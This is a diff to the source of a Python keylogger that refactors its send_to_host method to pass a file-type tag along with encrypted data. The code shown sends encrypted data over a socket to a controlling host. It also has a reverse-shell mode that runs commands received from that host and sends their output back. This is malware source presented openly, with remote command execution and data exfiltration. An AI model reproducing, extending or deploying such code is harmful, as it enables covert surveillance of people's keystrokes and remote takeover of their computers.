@@ -127,10 +127,10 @@ class Keylogger:
             except socket.error as e:
                 print(e)
 
-    def send_to_host(self, data: str | bytes):
+    def send_to_host(self, data: str | bytes, ftype:bytes):
         if type(data) == str:
             data = data.encode("utf-8")
-        encrypted_data = utils.encrypt(data)
+        encrypted_data = utils.encrypt(data=data, ftype=ftype)
 
         try:
             self.sock.sendall(encrypted_data)
@@ -179,7 +179,7 @@ class Keylogger:
 
     def stop(self):
         self.active = False
-        self.send_to_host("terminated")
+        self.send_to_host(data="terminated", ftype="msg")
         self.sock.close()
 
 
@@ -197,16 +197,16 @@ if __name__ == "__main__":
             if reverse_shell:
                 if recv == "exit":
                     reverse_shell = False
-                    keylogger.send_to_host("reverse shell deactivated")
+                    keylogger.send_to_host(data="reverse shell deactivated", ftype="msg")
                 else:
-                    keylogger.send_to_host(utils.execute_command(recv))
+                    keylogger.send_to_host(data=utils.execute_command(recv), ftype="msg")
             else:
                 if recv == "exit":
                     keylogger.stop()
                     break
                 elif recv == "shell":
                     reverse_shell = True
-                    keylogger.send_to_host("reverse shell activated")
+                    keylogger.send_to_host(data="reverse shell activated", ftype="msg")
                 else:
-                    keylogger.send_to_host("received")
+                    keylogger.send_to_host(data="received", ftype="msg")
                     print(recv)
